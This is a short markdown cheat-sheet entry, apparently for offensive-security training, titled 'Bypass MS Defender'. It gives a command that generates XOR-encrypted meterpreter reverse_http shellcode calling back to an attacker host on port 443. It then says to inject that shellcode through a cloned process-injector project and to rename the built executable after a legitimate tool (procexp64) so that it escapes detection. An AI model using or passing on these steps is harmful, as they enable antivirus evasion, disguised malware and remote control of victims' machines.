# Bypass MS Defender 

Generate Shellcode for C#

```shell
python3 shellcodeCrypter-msfvenom.py kali 443 xor cs 250 windows/x64/meterpreter/reverse_http
```

Clone the [Shellcode Process Injector](https://github.com/chvancooten/OSEP-Code-Snippets/tree/main/Shellcode%20Process%20Injector) project and copy the previous shellcode at buf variable. `Build` -> `Batch Build` -> `Select a Build` -> Click on `Build` .

Rename the final executable. Use offical appilcation names like: procexp64

```shell
.\procexp64.exe
```
